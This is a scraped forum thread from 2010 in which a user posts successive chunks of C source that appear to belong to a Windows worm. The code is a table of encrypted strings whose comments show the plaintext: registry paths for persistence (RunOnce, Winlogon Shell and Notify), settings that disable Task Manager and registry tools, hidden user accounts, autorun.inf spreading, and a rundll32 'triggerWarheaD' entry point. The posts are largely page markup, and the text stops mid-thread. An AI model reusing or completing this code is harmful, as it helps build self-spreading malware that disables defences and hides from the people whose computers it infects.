+					  &quot;\xE9\xDE\x82\xD1\xAC\x9A&quot;;//&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList&quot;; // accsubkey
+	plainbuffer[22] = &quot;\x93\x80\xBD\xCA\xC2\xC2\xC7\x8C\xAD\xF6&quot;;//&quot;\&quot;, ntevent&quot;;
+	plainbuffer[23] = &quot;\xF4\xA0\xA8\xB2\xF1\xE8\xEC\xFE\xC0\xF9\x85\x8F\xBD\x92\xE6\x93\x84\xE9&quot;\
+					  &quot;\x8A\xFA\x83\x98\x8E\xCC\x9A&quot;;//&quot;Explorer.exe winntobj.vbs&quot;; // shellval = &quot;Explorer.exe winntobj.vbs&quot;;</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">10:56 PM</span>.
+					
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_972" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_972" class="newreply" href="newreplyd1c9.html?do=newreply&amp;p=972" rel="nofollow" title="Reply With Quote"><img id="quoteimg_972" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_973">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:43 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post973" href="showthread77e6-2.html?t=333&amp;p=973&amp;viewfull=1#post973" class="postcounter">#4</a><a id="postcount973" name="4"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_973_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_973">
+						<blockquote class="postcontent restore ">
+							<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">plainbuffer[24] = &quot;\xDF\xC5\xEB\xCB\xDB\xBB\xFF\x8A\x80\xD7\xA6\xFB\xC3\xC2\xD7\x9B\x8D\xF8&quot;\
+					  &quot;\xE4\xFA\xF0\x81\xF2\xDC\x9D\xA7\xA2\xF2\xA8\xBF\xAE\x8C\xC3\xC7\xFA\xCA&quot;\
+					  &quot;\xFF\xCF\xEE\xE1\xF4\x8D\x9B\xE3\xC0\xB5\xFE\x86\xEC\x94\xED\xB1\xF4\xCC&quot;\
+					  &quot;\xB4\xB0\xC3\xD4\xC1&quot;;//&quot;software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer&quot;; // subkey
+	plainbuffer[25] = &quot;\xE0\x86\xCE\xF9\xCB\xCE\xA8\xD4\xF1\xD6\xC4\xEF\x9F\xF2\xAC\xA5\xC2\xAA&quot;\
+					  &quot;\xB6\xCA\x8C\xE3\xD5\xB6\xD9\xEE\x84\xEF\xCF\xC1\xD7\xB0\xB6\xEB\x8C\x8C&quot;\
+					  &quot;\xAA\xD0\xC4\xC0\x86\xF1\x90\xA0\xF0\xE7\xCC\xB4\x98\x99\xC1\x96\xC6\xDA&quot;\
+					  &quot;\xAC\xED\xB2&quot;;//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system&quot;; // subkey1
+	plainbuffer[26] = &quot;\xDC\xE3\xBD\xCA\xFC\xC4\xE2\xE4\xF9\x8B\x82\xCA&quot;;//&quot;SearchHidden&quot;;
+	plainbuffer[27] = &quot;\x9B\xB6\xFC\xCB\xE5\xF3\xF9\x80\xE2\xE8\xA6\xF9\xBB\xED\x88\x8A\xF3\x92\x83\xF7&quot;;//&quot;DisableRegistryTools&quot;;
+	plainbuffer[28] = &quot;\xD2\x9D\x99\xFC\x84\xBC\xF2\x8E\xFE\xA6\x91\xF5\xC7\xA3&quot;;//&quot;DisableTaskmgr&quot;;
+	plainbuffer[29] = &quot;\xEB\xC5\xDA\xC0\xC6&quot;;//&quot;Shell&quot;;
+	plainbuffer[30] = &quot;\xA5\xBE\xCC\xDE\xDA\x8F&quot;;//&quot;natsec&quot;;
+	plainbuffer[31] = &quot;\xFF\xDC\xDE\xCF\xE8\xB7\xA7\xDA\xEA\xE9\x99\xD0\xAC\xC6\xA1\xF8\xC5&quot;;//&quot;ScreenSaveTimeOut&quot;;
+	plainbuffer[32] = &quot;\x9F\xB9\xC1\xE9\xC9\xA0\xEB\xBE\x98\xC8\xCD\xF1\xB4\x8B\xA8\xFA\x8A\xDC\xFB&quot;;//&quot;ScreenSaverIsSecure&quot;;
+	plainbuffer[33] = &quot;\xBF\x9E\x9F\xE5\xFE\xAB\xF9\xFD\x9D\x98\xEF\xC9&quot;;//&quot;SCRNSAVE.EXE&quot;;
+	plainbuffer[34] = &quot;\xEE\x86\xFD\x98\x8F\xF3\xB6\xF9\x9F\xD3\xAC\xC7\x84\xF3\xE3\xA8\xDE&quot;;//&quot;screenSaveTimeOut&quot;;
+	plainbuffer[35] = &quot;\xFF\xB2\xE2\x98\x8F\xEF\xBF\xFD\xC3\xE5\xCD\x90\x8F\xE9\xD6&quot;;//&quot;ShowSuperHidden&quot;;
+	plainbuffer[36] = &quot;\x97\xF8\x9D\xE7\x82\xDD\xC7\xBE&quot;;//&quot;Kernel32&quot;;
+	plainbuffer[37] = &quot;\x92\xC2\x8C\xD7\xAF\xC4\xD1\x9B\xC9\xFF\xC5\xEE&quot;;//&quot;LoadLibraryA&quot;;
+	plainbuffer[38] = &quot;\x8B\xF0\xBC\x9D\xAF\xC2\xDF\xCA\xB4\xE0\xA9\xAC\xEE\xE1\xDC\xB2\x9B\x9E&quot;\
+					  &quot;\xC1\xB2\xD6\xC7\xBC\xE7\xA8\x81\xC2\xBC\xE0\x99\xFE\xF8\xFC\xB9\xD9\xB6&quot;\
+					  &quot;\x9B\xAB\xFD\xE6\xC2\x81\xC8\xAA\x8C\xE5\xE8\xEF\xD4&quot;;//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;; // subkey
+	plainbuffer[39] = &quot;\xCF\xB2\xAC\xC9\xB2\xEB\xAF\xAF\xC5\xA8\xE3\x8A\xC4\x97\xAC\xB0\xE9\xDE&quot;\
+					  &quot;\xDB\xC8\xF5\xBC\xE3\xE0\xB8\xF9\x93\xDC\x84\xAC\xEE\x98\x81\xF0\xFA\xB1&quot;\
+					  &quot;\xE6\x9C\xB7\xDD\xCB\xFD\xB5\xC0\xB6\x9C\xDF\x89\xB5&quot;;//&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;; // lmsubkey
+	plainbuffer[40] = &quot;\xC4\xBE\xF0\xA4\xAA\xE9\xA3\x87\xD1\x80\xE5\xCF\x8D\xA9\xD3\xD8\xE2\xAF&quot;\
+					  &quot;\xED\xE4\xC2\xC5\xEE\xBB\xC6\xCB\x8D\xF1\xF8\xF6\xCE\xCA\xDC\xD5\xFA\x8D&quot;\
+					  &quot;\xDB\xEE\xB4\xEA\xA6\xB6\xFC\xB1\xF6\x89\xC4\x93\x96\xF2\x82\xF0\xF2\x86&quot;\
+					  &quot;\xD3\x98\xBF\xB6\xDE\xD4\xE3\xBB\xE5\xC2\x83\xED\x9C\xB2\x9E&quot;;//&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\WinNTsec&quot;; // ntfsubkey
+	plainbuffer[41] = &quot;\xC9\xE9\xE2\xA9\xD5\xAD\x90\xDC\xAD\x93&quot;;//&quot;rundll32 \&quot;&quot;;
+	plainbuffer[42] = &quot;\xEE\xF6\xC7\xFE\xC5\xA9\xDF\xBA\x9C\xFA\xDE\xCA\xAF\xBD\xAC\xDD&quot;;//&quot;\&quot;,triggerWarheaD&quot;;
+	plainbuffer[43] = &quot;\x87\xB7\xE7\x9A\xB8\xA3\xDF&quot;;//&quot;ntevent&quot;; // val2 = &quot;ntevent&quot;;
+	plainbuffer[44] = &quot;\xB4\xD4\xE8\xF8\xBD\xF9\x9E&quot;;//&quot;*NatSec&quot;;
+	plainbuffer[45] = &quot;\xD8\xEF\xBB\x80\x8A\xE1\xC9&quot;;//&quot;DllName&quot;;
+	plainbuffer[46] = &quot;\xE1\xF6\x88\xF9\xDD&quot;;//&quot;Logon&quot;;
+	plainbuffer[47] = &quot;\xE2\x80\xED\xCE\xAC\x8C\xD9\xD4\xDF\xCD&quot;;//&quot;StartShell&quot;;
+	plainbuffer[48] = &quot;\xBA\xDC\xEC\xCE\xDB\xAF\xC1&quot;;//&quot;Startup&quot;;
+	plainbuffer[49] = &quot;\x89\x9D\xB9\xD1\xD9\xFC\x8B\xDF\xA5\xAA\xF2\xDD\xCE\xAB\x98\x98&quot;;//&quot;StartScreenSaver&quot;;
+	plainbuffer[50] = &quot;\xB1\xDE\xE9\xFC\xE2\xFE\xCE\xEA\xE3\xB2\xEB\xFE\xDA\xCF\xFF&quot;;//&quot;StopScreenSaver&quot;;
+	plainbuffer[51] = &quot;\xC6\x86\xD5\x93&quot;;//&quot;Lock&quot;;
+	plainbuffer[52] = &quot;\xF0\xCF\x8B\xDA\xBB\xB8&quot;;//&quot;Unlock&quot;;
+	plainbuffer[53] = &quot;\xEC\xBE\xE5\xF8\x97\xD0&quot;;//&quot;Logoff&quot;;
+	plainbuffer[54] = &quot;\xFA\xE2\xCC\xDA\xF4\xF7\x86\xC3\xD4&quot;;//&quot;PostShell&quot;;
+	plainbuffer[55] = &quot;\x9F\xDC\x8C\xB8\x93\xA1\xC9\xC9\xF9&quot;;//&quot;Reconnect&quot;;
+	plainbuffer[56] = &quot;\xFD\xA8\xD0\x8D\xE2\xDF\xF2\xAF\x8D\xEE&quot;;//&quot;Disconnect&quot;;
+	plainbuffer[57] = &quot;\xF0\xAF\xCD\xAB\x81\xDF\xCA\xD6\xE9\xB1\xA3\xFF&quot;;//&quot;\\autorun.inf&quot;; // *autoptr
+	plainbuffer[58] = &quot;\xB5\xA4\xE3\x81\xB8\x83\xF8\x83\xAF\xF7\xFD&quot;;//&quot;\\gameNS.EXE&quot;; // *natptr = &quot;\\gameNS.EXE&quot;;
+	plainbuffer[59] = &quot;\xB2\xCE\x98\x9E\xFC\x89\xE6\x9C\x9E\xF8\xCB\xFA\x88\xC2&quot;;//&quot;\\Retaliate.bat&quot;; // *natbptr = &quot;\\NatSec.bat&quot;;
+	plainbuffer[60] = &quot;\xFC\xCC\xCA\xD8\xC5\xFF\xCA\xC2\x87\x87\xD4\x88\xF2\xAA\xB8\xDC\xC2&quot;\
+					  &quot;\xD7\x80\xCB\xEF\xD7\xC0\xF4\x80\xF8\x93\x9F\xA7\x9B\x91\xBB\xA2\xAE&quot;\
+					  &quot;\xC9\xE3\xDC\xD8\xCA\xFD\xDD\xE3\xAE\xF3\xA2\xEB\xF8\xC3\xFC\xEB\x86&quot;\
+					  &quot;\xEC\x90\x91\x9B\xFE\x9C\xBD\xBB\xD8\xC5\x93\xD5\xDA\xD4\xD1\xB7\x99&quot;\
+					  &quot;\xAE\xE1\x8B\x84\xE0\xF0\x92\x9A\xF8\x8B\x8B\xDE\xD2\xAB\x8D\xC8\x8E&quot;\
+					  &quot;\xEF\xB1\xC8\xC7\x88\xC4\xE4\xDD\xDB\xBF\x9F\xCF\xFA\xD9\x86\xD6\xDF&quot;\
+					  &quot;\xBA\xA9\xC5\xAB\x99\xF8\xC5\xC3\xDE\xAD\xCB\xED\xB9\xC8\x9A\xC0\xD0&quot;\
+					  &quot;\xA5\xA8\xF0\xA8\x9D\xAB\x83\xC2\xC1\x84\xD4\xE0\xB9\xF9\xFC\xD6\xFD&quot;\
+					  &quot;\x9F\x8B\xEE\x8C\xDC\x89\xBE\xE7\xAD\x9F\xFF\x8B\xE1\x82\xE2\xFA\xBE&quot;\
+					  &quot;\xED\xFB\xBB\x8C\xAA\xF1\xEF\xC3\xAF\xFF\xF3\xC2\xCE\xE9\xAC\xDD\xF4&quot;\
+					  &quot;\xD7\xEA\xA6\xA8\xD0\xF6\xDF\x90\x87\xEE\x87\x82\xC8\xF9\xA1\xF3\xC1&quot;\</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">10:59 PM</span>.
+					
+					
+						<span class="reason">Reason:</span> ewqr
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_973" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_973" class="newreply" href="newreplyc635.html?do=newreply&amp;p=973" rel="nofollow" title="Reply With Quote"><img id="quoteimg_973" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_975">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:50 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post975" href="showthread2373.html?t=333&amp;p=975&amp;viewfull=1#post975" class="postcounter">#5</a><a id="postcount975" name="5"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_975_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_975">
+						<blockquote class="postcontent restore ">
+							<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">plainbuffer[69] = &quot;\xBC\xB9\xEE\xEF\xF7\xD3\xC7\xF7\xA4\xBD\xE3\xD1\xCE\xFC\xCF&quot;\
+					  &quot;\xAB\x93\xA9\xA6\x9B\xD0\xA9\xA8\x93\x8B\xC7\xD6\xCF\xDB\xA5&quot;\
+					  &quot;\x9E\xD4\xCF\xCA\x98\xE5\xDF\xDC\x8A\xF2\x86\xEA\x82\x93\xDD&quot;\
+					  &quot;\x86\x9B\xB7\xBD\xDB\xE2\xE3\xF7\xD0\xC5\xC6\xE8\xBD\x8E\xF9&quot;\
+					  &quot;\x8B\x89\xE7\x8C\xAA\x99\xFE\x97\xDF\xE0\xC7\xF1\x9F\xDF\x8A&quot;\
+					  &quot;\xC6\x8E\xC8\xDD\x9D\xDB\xA3\xF5\xDB\xBF\xDC\x85\xAB\x84\x86&quot;\
+					  &quot;\x82\xFF\xB5\x99\xF4\x88\x85\xF4\x86\xE8\x9F\x8A\xDE\xF8\xB9&quot;\
+					  &quot;\xC7\x9A\xC5\xCC\xBB\xB6\xEA\xD0&quot;;
+	plainbuffer[70] = &quot;\xB7\xFB\xF4\xFC\xA3\xFB\xA0\x99\xF6\xE2\xEB\xDF&quot;;//&quot;\\winntsp.vbs&quot;; // *sfpointr
+	plainbuffer[71] = &quot;\x83\xA9\x8F\x9E\xE8\xF5\x8D\x9E\xB2\x98\x92\xF8&quot;;//&quot;\\wscript.exe&quot;;
+	plainbuffer[72] = &quot;\xEB\x8E\x8C\xF6\xC5\xA4\xE0\xCF\xFC&quot;;//&quot;wscript \&quot;&quot;;
+	plainbuffer[73] = &quot;\xF2&quot;;//&quot;\&quot;&quot;;
+	plainbuffer[74] = &quot;\xFB\xDB\xDA&quot;;//&quot; ji&quot;;
+	plainbuffer[75] = &quot;\x8D\x89\x8F\xF5\x84\xFE\xF8\xB3\xBD\x84\xAE\xA9\xD9\x8D\xDD&quot;\
+					  &quot;\x85\xEF\xC4\xED\xD1\x8E\xB6\x87\xA6\xDE\x8A\xE5\xB9\xFE\xC3&quot;;
+					  //&quot; tuhaadi seva bich haazir hai.&quot;;
+	plainbuffer[76] = &quot;\xB9\xE4\xDF\xF8\xA5\x99\xE9\xBF\xDE\x84\xAF\x80\xAC\xE1\xBC\xDB\x8E\xC4\xA3\xB9&quot;;
+					  //&quot;Windows Task Manager&quot;;
+	plainbuffer[77] = &quot;\xE4\xFF\xC7\xD9\x8C\xD6\x8F&quot;;//&quot;Jaijeya&quot;;
+	plainbuffer[78] = &quot;\xA2\xC0\xCA\x93\x89\xDF\xE9\xA8\x9D\xC7\xBD\xE4\xCD\xB6\xE7&quot;\
+					  &quot;\xCF\x91\xFE\x9C\xF3\xE9\x91\x96\xB9\xE1&quot;;
+					  //&quot;Hor Theek-Thaak Hainn Na?&quot;;
+	plainbuffer[79] = &quot;\x9A\xD6\xBC\x9D\xAC\xE0\xA4\xFE\xE2\xA4\xEE\x83\xF9\xDD\xB0&quot;\
+					  &quot;\xBA\x88\xB2\xDE\xCC\x91&quot;;
+					  //&quot;Tusaan bas huqm deya.&quot;;
+	plainbuffer[80] = &quot;\xAC\xC4\xB3&quot;;//&quot;Run&quot;;
+	plainbuffer[81] = &quot;\x9C\xDE\xDF\xC0\xD5\x9F\xED\xE1\xDE\xCC\x88\xCF\xB1\xAC\xC3\xE2&quot;\
+					  &quot;\xA9\xB5\xD8\xBD\xE6\xD9\xE1\x9A\x81\xFD\xAC\xE0\xB0\xFA\xF7\xC9&quot;\
+					  &quot;\x95\xAD\x9A\xE7\xEB\x81\x9D\xAB\x9D\x86\xAE\xF2\xB1\xB9\xD0\xFE&quot;\
+					  &quot;\xAB\xD9\xB6\xD2\xE4\x9F\xF1\xCD\x99\xFF\xE9\xE4\xE1\x8A\x9B\xDE&quot;\
+					  &quot;\x94\xBD\x87\xE0\xE5\xEE\xA6\xEA\x85\xEF\xA1\xAE\x89\x95\xCD\xDA&quot;\
+					  &quot;\xA9\xD5\xB5\xDA\xAC\xFA\x8A\x81\xFB\x8D\xDB\x8A\xE1\xF8\xB2\xF0&quot;\
+					  &quot;\xAF\xF1\x87\xB9\xE0\xFA\xC9\xBE\xB8\xD5\x91\xDE\xF4\xCA\xC4\xF1&quot;\
+					  &quot;\xD0\xC1\xE7\xB1\xDD\xBF\x91\x8A\xAF\xF3\x8E\x93\xD7\xF0\x9E\xBE&quot;\
+					  &quot;\xBB\xAC\xAA\x8E\xB9\xFF\xEF\x9E\x98\xBC\xC0\xCA\xBF\xA7\xDF\x94&quot;\
+					  &quot;\x86\xED\xC8\xE3\x87\x96\x99\xBC\xBC\xE0\xDF\xE9\xEB\xBC\xB4\xE8&quot;\
+					  &quot;\xFD\xEF\xE2\xAA\xF3\x81\xFE\xBA\xDD\x9C\xF1\xDC\xA4\xFB\x9D\xAA&quot;\
+					  &quot;\x92\xCA\xC7\xC7\xC1\xB0\xB6\x91\x89\xBF\xBC\xEC\x88\xD3\xE8\xB5&quot;\
+					  &quot;\x80\x96\xD2\xA7\xAA\xE4\xA4\x8B\xEE\x95\xA7\xF8\xA8\xFB\xF5\xC7&quot;\
+					  &quot;\xB8\x82\xB4\xF1\xF4\xC0\x84\xC3\x81\x83\xAE\xE0\x87\x9E\xE9\xD8&quot;\
+					  &quot;\xDF\xA9\xC2\xDD\xCA\xBE\xC5\xC4\xC4\xD9\xE1\xF4\x8C\x98\xEE\xCD&quot;\
+					  &quot;\xC9\xCB\xF9\xDA\xE1\xC5\xF5\x86\xCC\xCC\xF9\xBA\x82\xAC\xF0\xAD&quot;\
+					  &quot;\xC3\xAE\xD9\xD3\xB4\xF8\x91\xE8\xF3\xA8\xF6\xD5\xE2\xD5\xCB\xD9&quot;\
+					  &quot;\xCD\xAF\xE3\xC1\xBD\xCC\x9B\xB2\x8F\xEF\x91\x8A\xE2\xBA\xFD\xA3&quot;\
+					  &quot;\x81\xB9\xF3\xCD\xDB\xAC\x8E\xF0\xF1\xF9\x8A\x89\xD8\xDA\xDE\xE4&quot;\
+					  &quot;\xEC\xB4\x91\xB1\xDF\xE4\xA8\xDA\xAA\xF6\x9D\xE8\xC3\xBC\xB9\x9A&quot;\</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">11:01 PM</span>.
+					
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_975" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_975" class="newreply" href="newreplyd6af.html?do=newreply&amp;p=975" rel="nofollow" title="Reply With Quote"><img id="quoteimg_975" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_974">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:48 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post974" href="showthreadc372.html?t=333&amp;p=974&amp;viewfull=1#post974" class="postcounter">#6</a><a id="postcount974" name="6"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_974_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
